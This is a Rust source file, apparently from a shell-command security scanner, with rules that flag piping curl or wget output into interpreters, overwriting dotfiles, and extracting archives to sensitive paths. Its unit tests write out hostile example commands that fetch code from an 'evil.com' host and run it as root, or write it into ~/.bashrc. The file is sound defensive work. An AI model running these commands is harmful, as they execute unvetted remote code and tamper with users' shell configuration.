use crate::extract::ScanContext;
use crate::tokenize::{self, ShellType};
use crate::verdict::{Evidence, Finding, RuleId, Severity};

/// Run command-shape rules.
pub fn check(
    input: &str,
    shell: ShellType,
    cwd: Option<&str>,
    scan_context: ScanContext,
) -> Vec<Finding> {
    let mut findings = Vec::new();
    let segments = tokenize::tokenize(input, shell);

    // Check for pipe-to-interpreter patterns
    let has_pipe = segments.iter().any(|s| {
        s.preceding_separator.as_deref() == Some("|")
            || s.preceding_separator.as_deref() == Some("|&")
    });
    if has_pipe {
        check_pipe_to_interpreter(&segments, &mut findings);
    }

    // Check for insecure TLS flags in source commands
    for segment in &segments {
        if let Some(ref cmd) = segment.command {
            let cmd_base = cmd.rsplit('/').next().unwrap_or(cmd).to_lowercase();
            if is_source_command(&cmd_base) {
                let tls_findings =
                    crate::rules::transport::check_insecure_flags(&segment.args, true);
                findings.extend(tls_findings);
            }
        }
    }

    // Check for dotfile overwrites
    check_dotfile_overwrite(&segments, &mut findings);

    // Check for archive extraction to sensitive paths
    check_archive_extract(&segments, &mut findings);

    // Check for cargo install/add without supply-chain audit (exec-only)
    if scan_context == ScanContext::Exec {
        check_vet_not_configured(&segments, cwd, &mut findings);
    }

    findings
}

/// Resolve the effective interpreter from a segment.
/// If the command is `sudo`, `env`, or an absolute path to one of them,
/// look past flags and flag-values to find the real interpreter.
fn resolve_interpreter_name(seg: &tokenize::Segment) -> Option<String> {
    if let Some(ref cmd) = seg.command {
        let cmd_base = cmd.rsplit('/').next().unwrap_or(cmd).to_lowercase();
        if is_interpreter(&cmd_base) {
            return Some(cmd_base);
        }
        if cmd_base == "sudo" {
            // Flags that take a separate value argument
            let sudo_value_flags = ["-u", "-g", "-C", "-D", "-R", "-T"];
            let mut skip_next = false;
            for (idx, arg) in seg.args.iter().enumerate() {
                if skip_next {
                    skip_next = false;
                    continue;
                }
                let trimmed = arg.trim();
                if trimmed.starts_with("--") {
                    // --user=root: long flag with =, skip entirely
                    // --user root: long flag without =, skip next arg
                    if !trimmed.contains('=') {
                        skip_next = true;
                    }
                    continue;
                }
                if trimmed.starts_with('-') {
                    if sudo_value_flags.contains(&trimmed) {
                        skip_next = true;
                    }
                    continue;
                }
                let base = trimmed.rsplit('/').next().unwrap_or(trimmed).to_lowercase();
                if base == "env" {
                    return resolve_env_from_args(&seg.args[idx + 1..]);
                }
                if is_interpreter(&base) {
                    return Some(base);
                }
                break;
            }
        } else if cmd_base == "env" {
            return resolve_env_from_args(&seg.args);
        }
    }
    None
}

fn resolve_env_from_args(args: &[String]) -> Option<String> {
    let env_value_flags = ["-u"];
    let mut skip_next = false;
    for arg in args {
        if skip_next {
            skip_next = false;
            continue;
        }
        let trimmed = arg.trim();
        if trimmed.starts_with("--") {
            if !trimmed.contains('=') {
                skip_next = true;
            }
            continue;
        }
        if trimmed.starts_with('-') {
            if env_value_flags.contains(&trimmed) {
                skip_next = true;
            }
            continue;
        }
        // VAR=val assignments
        if trimmed.contains('=') {
            continue;
        }
        let base = trimmed.rsplit('/').next().unwrap_or(trimmed).to_lowercase();
        if is_interpreter(&base) {
            return Some(base);
        }
        break;
    }
    None
}

fn check_pipe_to_interpreter(segments: &[tokenize::Segment], findings: &mut Vec<Finding>) {
    for (i, seg) in segments.iter().enumerate() {
        if i == 0 {
            continue;
        }
        if let Some(sep) = &seg.preceding_separator {
            if sep == "|" || sep == "|&" {
                if let Some(interpreter) = resolve_interpreter_name(seg) {
                    // Find the source segment
                    if i > 0 {
                        let source = &segments[i - 1];
                        let source_cmd = source.command.as_deref().unwrap_or("unknown").to_string();
                        let source_base = source_cmd
                            .rsplit('/')
                            .next()
                            .unwrap_or(&source_cmd)
                            .to_lowercase();

                        let rule_id = match source_base.as_str() {
                            "curl" => RuleId::CurlPipeShell,
                            "wget" => RuleId::WgetPipeShell,
                            _ => RuleId::PipeToInterpreter,
                        };

                        let display_cmd = seg.command.as_deref().unwrap_or(&interpreter);

                        findings.push(Finding {
                                rule_id,
                                severity: Severity::High,
                                title: format!("Pipe to interpreter: {source_cmd} | {display_cmd}"),
                                description: format!(
                                    "Command pipes output from '{source_base}' directly to interpreter '{interpreter}'. Downloaded content will be executed without inspection."
                                ),
                                evidence: vec![Evidence::CommandPattern {
                                    pattern: "pipe to interpreter".to_string(),
                                    matched: format!("{} | {}", source.raw, seg.raw),
                                }],
                            });
                    }
                }
            }
        }
    }
}

fn check_dotfile_overwrite(segments: &[tokenize::Segment], findings: &mut Vec<Finding>) {
    for segment in segments {
        // Check for redirects to dotfiles
        let raw = &segment.raw;
        if (raw.contains("> ~/.")
            || raw.contains("> $HOME/.")
            || raw.contains(">> ~/.")
            || raw.contains(">> $HOME/."))
            && !raw.contains("> /dev/null")
        {
            findings.push(Finding {
                rule_id: RuleId::DotfileOverwrite,
                severity: Severity::High,
                title: "Dotfile overwrite detected".to_string(),
                description: "Command redirects output to a dotfile in the home directory, which could overwrite shell configuration".to_string(),
                evidence: vec![Evidence::CommandPattern {
                    pattern: "redirect to dotfile".to_string(),
                    matched: raw.clone(),
                }],
            });
        }
    }
}

fn check_archive_extract(segments: &[tokenize::Segment], findings: &mut Vec<Finding>) {
    for segment in segments {
        if let Some(ref cmd) = segment.command {
            let cmd_base = cmd.rsplit('/').next().unwrap_or(cmd).to_lowercase();
            if cmd_base == "tar" || cmd_base == "unzip" || cmd_base == "7z" {
                // Check if extracting to a sensitive directory
                let raw = &segment.raw;
                let sensitive_targets = [
                    "-C /",
                    "-C ~/",
                    "-C $HOME/",
                    "-d /",
                    "-d ~/",
                    "-d $HOME/",
                    "> ~/.",
                    ">> ~/.",
                ];
                for target in &sensitive_targets {
                    if raw.contains(target) {
                        findings.push(Finding {
                            rule_id: RuleId::ArchiveExtract,
                            severity: Severity::Medium,
                            title: "Archive extraction to sensitive path".to_string(),
                            description: format!(
                                "Archive command '{cmd_base}' extracts to a potentially sensitive location"
                            ),
                            evidence: vec![Evidence::CommandPattern {
                                pattern: "archive extract".to_string(),
                                matched: raw.clone(),
                            }],
                        });
                        return;
                    }
                }
            }
        }
    }
}

/// Cargo global flags that consume the next token as a value.
const CARGO_VALUE_FLAGS: &[&str] = &[
    "-Z",
    "-C",
    "--config",
    "--manifest-path",
    "--color",
    "--target-dir",
    "--target",
];

/// Find the cargo subcommand (first positional arg), skipping flags and toolchain specs.
/// Returns true if the subcommand is `install` or `add`.
fn is_cargo_install_or_add(args: &[String]) -> bool {
    let mut skip_next = false;
    for arg in args {
        if skip_next {
            skip_next = false;
            continue;
        }
        // Toolchain specs (+nightly, +stable)
        if arg.starts_with('+') {
            continue;
        }
        // Long flags with = (--config=foo): skip this arg only
        if arg.starts_with("--") && arg.contains('=') {
            continue;
        }
        // Known value-taking flags: skip this AND next
        if CARGO_VALUE_FLAGS.contains(&arg.as_str()) {
            skip_next = true;
            continue;
        }
        // Other flags (--locked, -v, etc.)
        if arg.starts_with('-') {
            continue;
        }
        // First positional arg is the subcommand — only match install/add
        return arg == "install" || arg == "add";
    }
    false
}

/// Warn when `cargo install/add` is used and no supply-chain audit directory exists.
fn check_vet_not_configured(
    segments: &[tokenize::Segment],
    cwd: Option<&str>,
    findings: &mut Vec<Finding>,
) {
    let is_cargo_install = segments.iter().any(|s| {
        if let Some(ref cmd) = s.command {
            let base = cmd.rsplit('/').next().unwrap_or(cmd);
            if base == "cargo" {
                return is_cargo_install_or_add(&s.args);
            }
        }
        false
    });
    if !is_cargo_install {
        return;
    }

    // Check if supply-chain/ config exists relative to the analysis context cwd.
    // Require an explicit cwd — without one we cannot reliably check the filesystem.
    let cwd = match cwd {
        Some(dir) => dir,
        None => return,
    };
    let check_path = std::path::PathBuf::from(cwd).join("supply-chain/config.toml");
    if check_path.exists() {
        return;
    }

    findings.push(Finding {
        rule_id: RuleId::VetNotConfigured,
        severity: Severity::Low,
        title: "No supply-chain audit configured".into(),
        description: "Consider running `cargo vet init` to enable dependency auditing.".into(),
        evidence: vec![],
    });
}

fn is_source_command(cmd: &str) -> bool {
    matches!(
        cmd,
        "curl"
            | "wget"
            | "fetch"
            | "scp"
            | "rsync"
            | "iwr"
            | "irm"
            | "invoke-webrequest"
            | "invoke-restmethod"
    )
}

fn is_interpreter(cmd: &str) -> bool {
    matches!(
        cmd,
        "sh" | "bash"
            | "zsh"
            | "dash"
            | "ksh"
            | "python"
            | "python3"
            | "node"
            | "perl"
            | "ruby"
            | "php"
            | "iex"
            | "invoke-expression"
    )
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::extract::ScanContext;

    #[test]
    fn test_pipe_sudo_flags_detected() {
        let findings = check(
            "curl https://evil.com | sudo -u root bash",
            ShellType::Posix,
            None,
            ScanContext::Exec,
        );
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
            "should detect pipe through sudo -u root bash"
        );
    }

    #[test]
    fn test_pipe_sudo_long_flag_detected() {
        let findings = check(
            "curl https://evil.com | sudo --user=root bash",
            ShellType::Posix,
            None,
            ScanContext::Exec,
        );
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
            "should detect pipe through sudo --user=root bash"
        );
    }

    #[test]
    fn test_pipe_env_var_assignment_detected() {
        let findings = check(
            "curl https://evil.com | env VAR=1 bash",
            ShellType::Posix,
            None,
            ScanContext::Exec,
        );
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
            "should detect pipe through env VAR=1 bash"
        );
    }

    #[test]
    fn test_pipe_env_u_flag_detected() {
        let findings = check(
            "curl https://evil.com | env -u HOME bash",
            ShellType::Posix,
            None,
            ScanContext::Exec,
        );
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
            "should detect pipe through env -u HOME bash"
        );
    }

    #[test]
    fn test_dotfile_overwrite_detected() {
        let cases = [
            "echo malicious > ~/.bashrc",
            "echo malicious >> ~/.bashrc",
            "curl https://evil.com > ~/.bashrc",
            "cat payload > ~/.profile",
            "echo test > $HOME/.bashrc",
        ];
        for input in &cases {
            let findings = check(input, ShellType::Posix, None, ScanContext::Exec);
            eprintln!(
                "INPUT: {:?} -> findings: {:?}",
                input,
                findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
            );
            assert!(
                findings
                    .iter()
                    .any(|f| f.rule_id == RuleId::DotfileOverwrite),
                "should detect dotfile overwrite in: {input}",
            );
        }
    }

    #[test]
    fn test_pipe_env_s_flag_detected() {
        let findings = check(
            "curl https://evil.com | env -S bash -x",
            ShellType::Posix,
            None,
            ScanContext::Exec,
        );
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
            "should detect pipe through env -S bash -x"
        );
    }

    #[test]
    fn test_pipe_sudo_env_detected() {
        let findings = check(
            "curl https://evil.com | sudo env VAR=1 bash",
            ShellType::Posix,
            None,
            ScanContext::Exec,
        );
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
            "should detect pipe through sudo env VAR=1 bash"
        );
    }

    #[test]
    fn test_vet_not_configured_fires_without_supply_chain() {
        let dir = tempfile::tempdir().unwrap();
        let cwd = dir.path().to_str().unwrap();
        let findings = check(
            "cargo install serde_json",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(findings
            .iter()
            .any(|f| f.rule_id == RuleId::VetNotConfigured));
    }

    #[test]
    fn test_vet_not_configured_suppressed_with_supply_chain() {
        let dir = tempfile::tempdir().unwrap();
        let sc_dir = dir.path().join("supply-chain");
        std::fs::create_dir_all(&sc_dir).unwrap();
        std::fs::write(sc_dir.join("config.toml"), "").unwrap();
        let cwd = dir.path().to_str().unwrap();
        let findings = check(
            "cargo install serde_json",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(!findings
            .iter()
            .any(|f| f.rule_id == RuleId::VetNotConfigured));
    }

    #[test]
    fn test_vet_not_configured_skips_non_install() {
        let dir = tempfile::tempdir().unwrap();
        let cwd = dir.path().to_str().unwrap();
        let findings = check(
            "cargo build",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(!findings
            .iter()
            .any(|f| f.rule_id == RuleId::VetNotConfigured));
    }

    #[test]
    fn test_vet_detects_cargo_with_flags() {
        let dir = tempfile::tempdir().unwrap();
        let cwd = dir.path().to_str().unwrap();
        let f1 = check(
            "cargo --locked install serde",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(f1.iter().any(|f| f.rule_id == RuleId::VetNotConfigured));
        let f2 = check(
            "cargo +nightly add tokio",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(f2.iter().any(|f| f.rule_id == RuleId::VetNotConfigured));
        let f3 = check(
            "cargo -Z sparse-registry install serde",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(f3.iter().any(|f| f.rule_id == RuleId::VetNotConfigured));
    }

    #[test]
    fn test_vet_skipped_in_paste_context() {
        let dir = tempfile::tempdir().unwrap();
        let cwd = dir.path().to_str().unwrap();
        let findings = check(
            "cargo install serde_json",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Paste,
        );
        assert!(!findings
            .iter()
            .any(|f| f.rule_id == RuleId::VetNotConfigured));
    }

    #[test]
    fn test_vet_no_false_positive_on_non_install_subcommand() {
        let dir = tempfile::tempdir().unwrap();
        let cwd = dir.path().to_str().unwrap();
        // "add" is a package name after "test", not the subcommand
        let f1 = check(
            "cargo test --package add",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(!f1.iter().any(|f| f.rule_id == RuleId::VetNotConfigured));
        // "install" after "build" is not a subcommand
        let f2 = check(
            "cargo build install",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(!f2.iter().any(|f| f.rule_id == RuleId::VetNotConfigured));
    }
}
